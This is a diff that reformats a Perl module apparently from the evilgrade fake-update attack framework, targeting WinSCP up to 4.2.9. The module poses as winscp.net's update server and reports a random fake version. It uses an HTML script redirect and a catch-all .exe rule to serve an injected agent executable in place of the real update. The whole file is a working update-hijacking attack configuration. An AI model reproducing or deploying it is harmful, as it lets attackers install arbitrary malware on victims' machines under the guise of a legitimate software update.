@@ -27,85 +27,91 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'WinSCP',
-    'version' => '1.0',
-    'appver' => '<= 4.2.9',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'winscp.net', 
-    'request' => [
-		    {
-		    'req' => '/updates.php', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => "version=<%VERSION%>",		    
-		    'parse' => '1',
-		    'file' => ''
-		    },
-		    #eng/docs/history
-		    {
-		    'req' => 'history', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => '',
-		    'cheader' => "HTTP/1.1 302 Found\r\n"
-				 ."Location: http://www.winscp.net/eng/docs/history\r\n" 
-				 ."Content-Length: 0 \r\n"
-				 . "Connection: close \r\n\r\n",
-		    },
-		    {
-		    'req' => 'download.php', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-                    'string' => '<html><script>window.location="http://winscp.net/winscpupdate<%RND1%>.exe"</script></html>',
-		    'parse' => '1',
-		    'file' => '',
-		    },
+my $base = {
+    'name'        => 'WinSCP',
+    'version'     => '1.0',
+    'appver'      => '<= 4.2.9',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'winscp.net',
+    'request'     => [
+        {   'req'    => '/updates.php',          #regex friendly
+            'type'   => 'string',                #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => '',
+            'string' => "version=<%VERSION%>",
+            'parse'  => '1',
+            'file'   => ''
+        },
 
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => ''
-		    },		    
-		    {
-		    'req' => '[\w\W]+', #regex anything
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => '',
-		    'cheader' => "HTTP/1.1 302 Found\r\n"
-				 ."Location: http://www.winscp.net/\r\n" 
-				 ."Content-Length: 0 \r\n"
-				 . "Connection: close \r\n\r\n",
-		    },
-		    
+        #eng/docs/history
+        {   'req'     => 'history',                 #regex friendly
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '0',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://www.winscp.net/eng/docs/history\r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+        {   'req'    => 'download.php',             #regex friendly
+            'type'   => 'string',                   #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '',
+            'string' =>
+                '<html><script>window.location="http://winscp.net/winscpupdate<%RND1%>.exe"</script></html>',
+            'parse' => '1',
+            'file'  => '',
+        },
+
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
+        {   'req'     => '[\w\W]+',                 #regex anything
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '0',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://www.winscp.net/\r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => "'9.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
-                                    'hidden' => 1,
-                                    'dynamic' =>1,},			    	  
-                    'rnd1'  => {  'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                  'dynamic' =>1,
-                               },
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val' =>
+                "'9.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+    }
 };
+
 #TODO: data1,data2 mac differences
 
 ##########################################################################
